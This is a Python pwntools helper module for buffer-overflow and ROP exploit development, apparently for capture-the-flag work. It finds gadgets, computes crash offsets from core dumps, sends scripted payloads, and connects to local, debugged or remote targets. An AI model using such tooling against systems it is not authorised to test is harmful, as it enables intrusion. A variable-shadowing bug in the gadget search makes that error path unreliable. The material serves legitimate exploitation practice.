from pwn import *
import subprocess
import os

def err(error):
	log.failure(error)
	exit()

def cli_run(cmd,cwd):
	subprocess.run(cmd, cwd=cwd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)

def send_payload(payload,inputs,io):
	for i in inputs:
		if len(i) != 2 or i[1] != "":
			io.recvuntil(i[1].encode())
		if "payload" in i[0]:
			io.send(payload+i[0].lstrip("payload").encode())
		else:
			io.send(i[0].encode())


def parse_input(inp):
	f = open(inp,"r")
	inputs = []
	for line in f.readlines():
		inputs.append([str(i).rstrip("\n").replace("\\n","\n") for i in line.split(" ")])
	return inputs


def find_gadgets(gadget,chall):
	ropg = subprocess.Popen(f"ROPgadget --binary={chall.path} --multibr".split(), stdout=subprocess.PIPE)
	grepr = subprocess.Popen(['grep', gadget], stdin=ropg.stdout,
                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	out,err = grepr.communicate()
	
	if out.decode() == "":
		err("Required ROPgadget(s) not found!")

	gadg_addr = int(out.decode().split(" ")[0],16)
	log.info(gadget.lstrip(": ")+" gadget -> "+hex(gadg_addr))

	return gadg_addr


def find_offset(args,n):
	io = start(False,args.chall,args.libc)
	send_payload(cyclic(512,n=n),args.inputs,io)
	io.wait(timeout=3)
	core = io.corefile
	io.close()
	subprocess.run("rm core*",shell=True)
	return(cyclic_find(core.fault_addr,n=n))


def start(remote_ip,chall,libc):
	if libc == None:
		env = {"PWD":os.getcwd()}
	else:
		env = {"LD_PRELOAD":libc}

	if remote_ip == "gdb":
		return gdb.debug(chall.path, env=env, gdbscript="break main")
	elif remote_ip:
		return remote(remote_ip.split(":")[0],int(remote_ip.split(":")[1]))
	else:
		return process(chall.path, env=env)